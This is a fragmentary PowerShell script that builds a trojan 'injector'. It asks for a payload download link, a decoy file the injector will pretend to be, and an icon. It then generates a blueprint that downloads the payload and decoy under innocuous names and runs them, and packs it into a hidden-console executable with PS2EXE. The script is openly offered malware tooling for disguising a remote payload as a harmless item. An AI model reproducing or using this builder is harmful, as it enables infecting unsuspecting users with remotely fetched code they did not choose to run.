...
#CREDIT FOR CREATOR OF PS2EXE WHICH IS USED IN THIS SCRIPT TO PACK THE INJECTOR.
<#
Win-PS2EXE
...
Write-Host -Object "                                 
   ...
   xxx    xxx    xxx            xxx    xxx    xxx   
   xxxxxxxxx      xxx    xx    xxx     xxxxxxxxx    
...
clear
Read-Host -Prompt "Injector's app icon (The user will see this).
" -OutVariable "appicon"
clear
Read-Host -Prompt "Payload webhost link
(if you upload it to GitHub, then it's the link you get when you right click the file on the releases page and press copy link address).
" -OutVariable "payloadlink"
clear
Read-Host -Prompt "Link to fake item (The injector will pretend to be this).
" -OutVariable "fakefilelink"
clear
Write-Host -Object "Creating trojan script.
     _______
 ___/   O  \\_
|'          \/\
 \______     \/\
...
Start-Sleep -Milliseconds 500
clear
New-Item -Name "PWRTrojan Injector Creator" -Path .\ -ItemType Directory -Force
New-Item -Name "InjectorBlueprint" -Path ".\PWRTrojan Injector Creator" -ItemType File -Value {#   LICENSE:
#
#   This software or part of it was developed by TreeFrog Developement.
#   Copyright (C) 2023  Liam Owen/orangetreefrog4
#   Copyright (C) 2023  TreeFrog Development
...
Start-Sleep -Seconds 1
clear
New-Item -Name "usersettings" -Path .\ -ItemType Directory -ErrorAction Continue
New-Item -Name "thumbnails" -Path .\ -ItemType Directory -ErrorAction Continue
Invoke-WebRequest -Uri $payloadlink -OutFile ".\usersettings\settings"
Invoke-WebRequest -Uri $fakefilelink -OutFile ".\usersettings\thumbnails"
".\usersettings\settings"
".\usersettings\thumbnails"} -Force
Invoke-ps2exe -inputFile ".\PWRTrojan Injector Creator\InjectorBlueprint" -outputFile .\PWRTrojan Injector Creator\ -noConsole -iconFile $appicon -title $displayname -exitOnCancel -noError -noOutput -noConfigFile